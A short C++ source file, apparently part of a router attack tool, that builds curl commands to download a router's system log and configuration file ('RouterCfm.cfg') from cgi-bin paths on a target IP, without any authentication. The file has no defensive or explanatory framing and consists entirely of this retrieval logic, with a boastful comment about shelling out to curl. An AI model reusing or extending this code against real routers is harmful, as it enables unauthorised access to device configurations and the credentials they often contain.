#include <string>
#include <fstream>
#include <iostream>

namespace setup {
	// instead using curl lib, i use curl on windows 200+ IQ
	std::string getsyslog(std::string ip) {
		std::string rawcommand = "curl http://" + ip + "/cgi-bin/DownloadSyslog/RouterSystem.log";
		return rawcommand;
	}
	std::string getcfg(std::string ip) {
		std::string rawcommand = "curl http://" + ip + "/cgi-bin/DownloadCfg/RouterCfm.cfg";
		return rawcommand;
	}
}

std::string act(std::string ip, int action) {
	std::string setcommand;
	if (action == 1)
	{
		setcommand = setup::getsyslog(ip);
	}
	else if (action == 2)
	{
		setcommand = setup::getcfg(ip);
	}
	return setcommand;
}